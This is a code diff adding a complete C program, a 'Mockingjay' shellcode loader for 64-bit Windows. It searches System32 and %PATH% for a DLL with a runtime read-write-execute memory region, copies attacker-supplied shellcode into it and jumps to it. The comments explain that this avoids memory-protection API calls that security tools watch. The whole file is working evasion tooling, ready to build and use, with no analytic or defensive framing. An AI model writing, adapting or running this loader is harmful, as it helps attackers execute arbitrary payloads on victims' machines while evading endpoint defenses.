@@ -1,0 +1,336 @@
+/*
+ * Mockingjay loader (x64, MSVC)
+ *
+ * Reads raw shellcode from argv[1], finds a signed DLL that has a section
+ * mapped as PAGE_EXECUTE_READWRITE at runtime (Mockingjay-style candidate),
+ * copies the shellcode into that section, and jumps to it.
+ *
+ * Candidate discovery uses VirtualQuery() over the mapped image, NOT the
+ * on-disk IMAGE_SECTION_HEADER.Characteristics. The on-disk flags do not
+ * reflect the runtime protection that the loader/linker assigns, which is
+ * the whole point of the Mockingjay technique.
+ *
+ * Build:
+ *   cl /nologo /O2 /GS- /Fe:mockingjay.exe mockingjay.c
+ */
+
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* ------------------------------------------------------------------ */
+/* Helpers                                                             */
+/* ------------------------------------------------------------------ */
+
+static unsigned char *read_file(const char *path, size_t *out_size)
+{
+    FILE *fp;
+    long  size;
+    unsigned char *buf;
+
+    *out_size = 0;
+    fp = fopen(path, "rb");
+    if (!fp) {
+        fprintf(stderr, "[-] fopen('%s') failed\n", path);
+        return NULL;
+    }
+    if (fseek(fp, 0, SEEK_END) != 0) {
+        fprintf(stderr, "[-] fseek(END) failed\n");
+        fclose(fp);
+        return NULL;
+    }
+    size = ftell(fp);
+    if (size <= 0) {
+        fprintf(stderr, "[-] ftell returned %ld\n", size);
+        fclose(fp);
+        return NULL;
+    }
+    if (fseek(fp, 0, SEEK_SET) != 0) {
+        fprintf(stderr, "[-] fseek(SET) failed\n");
+        fclose(fp);
+        return NULL;
+    }
+    buf = (unsigned char *)malloc((size_t)size);
+    if (!buf) {
+        fprintf(stderr, "[-] malloc(%ld) failed\n", size);
+        fclose(fp);
+        return NULL;
+    }
+    if (fread(buf, 1, (size_t)size, fp) != (size_t)size) {
+        fprintf(stderr, "[-] fread short read\n");
+        free(buf);
+        fclose(fp);
+        return NULL;
+    }
+    fclose(fp);
+    *out_size = (size_t)size;
+    return buf;
+}
+
+/*
+ * Walk the mapped image of `mod` and return the base of the first region
+ * that is PAGE_EXECUTE_READWRITE and at least `min_size` bytes long.
+ *
+ * This is the correct Mockingjay candidate check: it inspects the *runtime*
+ * page protection via VirtualQuery, not the on-disk section characteristics.
+ */
+static unsigned char *find_rwx_region(HMODULE mod, SIZE_T min_size, SIZE_T *out_size)
+{
+    BYTE *base = (BYTE *)mod;
+    IMAGE_DOS_HEADER *dos;
+    IMAGE_NT_HEADERS *nt;
+    BYTE *img_end;
+    BYTE *p;
+
+    *out_size = 0;
+    if (!base) return NULL;
+
+    dos = (IMAGE_DOS_HEADER *)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
+    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
+
+    /* Upper bound of the mapped image. */
+    img_end = base + nt->OptionalHeader.SizeOfImage;
+
+    p = base;
+    while (p < img_end) {
+        MEMORY_BASIC_INFORMATION mbi;
+        SIZE_T got = VirtualQuery(p, &mbi, sizeof(mbi));
+        BYTE *region_start;
+        SIZE_T region_size;
+
+        if (got != sizeof(mbi)) break;
+
+        region_start = (BYTE *)mbi.BaseAddress;
+        region_size  = mbi.RegionSize;
+
+        /* Advance at least one page to guarantee forward progress. */
+        if (region_size == 0) region_size = 0x1000;
+
+        if (mbi.State == MEM_COMMIT &&
+            mbi.Protect == PAGE_EXECUTE_READWRITE &&
+            region_size >= min_size) {
+            *out_size = region_size;
+            return region_start;
+        }
+
+        p = region_start + region_size;
+    }
+
+    return NULL;
+}
+
+/*
+ * Try to load a candidate DLL and return its runtime-RWX region.
+ * On success, returns non-NULL region pointer and sets *out_mod.
+ */
+static unsigned char *try_candidate(const char *path,
+                                    SIZE_T min_size,
+                                    HMODULE *out_mod,
+                                    SIZE_T *out_size)
+{
+    HMODULE mod;
+    unsigned char *region;
+
+    *out_mod = NULL;
+    *out_size = 0;
+
+    mod = LoadLibraryA(path);
+    if (!mod) return NULL;
+
+    region = find_rwx_region(mod, min_size, out_size);
+    if (!region) {
+        FreeLibrary(mod);
+        return NULL;
+    }
+    *out_mod = mod;
+    return region;
+}
+
+/*
+ * Enumerate *.dll in a single directory and try each.
+ */
+static unsigned char *scan_directory(const char *dir,
+                                     SIZE_T min_size,
+                                     HMODULE *out_mod,
+                                     SIZE_T *out_size)
+{
+    char pattern[MAX_PATH];
+    WIN32_FIND_DATAA fd;
+    HANDLE h;
+
+    *out_mod = NULL;
+    *out_size = 0;
+
+    if (snprintf(pattern, sizeof(pattern), "%s\\*.dll", dir) < 0)
+        return NULL;
+
+    h = FindFirstFileA(pattern, &fd);
+    if (h == INVALID_HANDLE_VALUE) return NULL;
+
+    do {
+        char full[MAX_PATH];
+        unsigned char *region;
+
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+
+        if (snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName) < 0)
+            continue;
+
+        region = try_candidate(full, min_size, out_mod, out_size);
+        if (region) {
+            printf("[+] Candidate: %s (%zu bytes RWX)\n",
+                   full, (size_t)*out_size);
+            FindClose(h);
+            return region;
+        }
+    } while (FindNextFileA(h, &fd));
+
+    FindClose(h);
+    return NULL;
+}
+
+/*
+ * Scan every directory on %PATH% plus System32 for a suitable DLL.
+ */
+static unsigned char *scan_path_and_system32(SIZE_T min_size,
+                                             HMODULE *out_mod,
+                                             SIZE_T *out_size)
+{
+    char sysdir[MAX_PATH];
+    char *path_env;
+    char *cursor;
+    unsigned char *region;
+    int dirs_scanned = 0;
+
+    *out_mod = NULL;
+    *out_size = 0;
+
+    /* System32 first — most likely to hold a signed candidate. */
+    if (GetSystemDirectoryA(sysdir, MAX_PATH)) {
+        printf("[*] Scanning %s\n", sysdir);
+        dirs_scanned++;
+        region = scan_directory(sysdir, min_size, out_mod, out_size);
+        if (region) return region;
+    }
+
+    path_env = getenv("PATH");
+    if (!path_env) {
+        printf("[*] %%PATH%% not set; scanned %d director%s\n",
+               dirs_scanned, dirs_scanned == 1 ? "y" : "ies");
+        return NULL;
+    }
+
+    /* Work on a copy so we can tokenize with strtok_s. */
+    {
+        size_t plen = strlen(path_env);
+        char *copy = (char *)malloc(plen + 1);
+        char *ctx = NULL;
+
+        if (!copy) return NULL;
+        memcpy(copy, path_env, plen + 1);
+
+        cursor = strtok_s(copy, ";", &ctx);
+        while (cursor) {
+            if (cursor[0] != '\0') {
+                printf("[*] Scanning %s\n", cursor);
+                dirs_scanned++;
+                region = scan_directory(cursor, min_size, out_mod, out_size);
+                if (region) {
+                    free(copy);
+                    return region;
+                }
+            }
+            cursor = strtok_s(NULL, ";", &ctx);
+        }
+        free(copy);
+    }
+
+    printf("[*] Scanned %d director%s; no runtime-RWX candidate found.\n",
+           dirs_scanned, dirs_scanned == 1 ? "y" : "ies");
+    return NULL;
+}
+
+/* ------------------------------------------------------------------ */
+/* main                                                                */
+/* ------------------------------------------------------------------ */
+
+int main(int argc, char *argv[])
+{
+    unsigned char *shellcode;
+    size_t         shellcode_size;
+    unsigned char *rwx;
+    SIZE_T         rwx_size;
+    HMODULE        host_mod;
+    void          *exec_addr;
+
+    if (argc < 2) {
+        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
+        return 1;
+    }
+
+    shellcode = read_file(argv[1], &shellcode_size);
+    if (!shellcode) return 1;
+
+    printf("[+] Loaded %zu bytes of shellcode from %s\n",
+           shellcode_size, argv[1]);
+
+    rwx       = NULL;
+    host_mod  = NULL;
+    rwx_size  = 0;
+
+    /*
+     * Discovery: scan %PATH% + System32 for a DLL whose mapped image
+     * contains a PAGE_EXECUTE_READWRITE region large enough for the
+     * shellcode. This is the Mockingjay identification step.
+     */
+    rwx = scan_path_and_system32(shellcode_size, &host_mod, &rwx_size);
+
+    if (!rwx) {
+        fprintf(stderr,
+                "[-] No DLL with a runtime RWX region >= %zu bytes found.\n"
+                "    Mockingjay requires such a module (e.g. msys-2.0.dll\n"
+                "    from MSYS2/Cygwin). Refusing to fall back to\n"
+                "    VirtualAlloc/VirtualProtect.\n",
+                shellcode_size);
+        free(shellcode);
+        return 2;
+    }
+
+    if (shellcode_size > (size_t)rwx_size) {
+        fprintf(stderr,
+                "[-] Shellcode (%zu) larger than RWX region (%zu)\n",
+                shellcode_size, (size_t)rwx_size);
+        free(shellcode);
+        return 3;
+    }
+
+    /*
+     * Copy shellcode into the already-RWX region. No protection change
+     * is required: the region was mapped RWX by the loader.
+     */
+    memcpy(rwx, shellcode, shellcode_size);
+    printf("[+] Shellcode copied into RWX region at %p\n", (void *)rwx);
+
+    exec_addr = (void *)rwx;
+
+    /* Release our own heap copy; the payload now lives in image memory. */
+    free(shellcode);
+
+    /*
+     * Transfer control. Using a function-pointer call keeps the immediate
+     * frame module-backed (the RWX region belongs to the host DLL).
+     */
+    printf("[+] Jumping to payload...\n");
+    fflush(stdout);
+
+    ((void (*)(void))exec_addr)();
+
+    /* If the payload returns, keep the DLL resident. */
+    (void)host_mod;
+
+    return 0;
+}
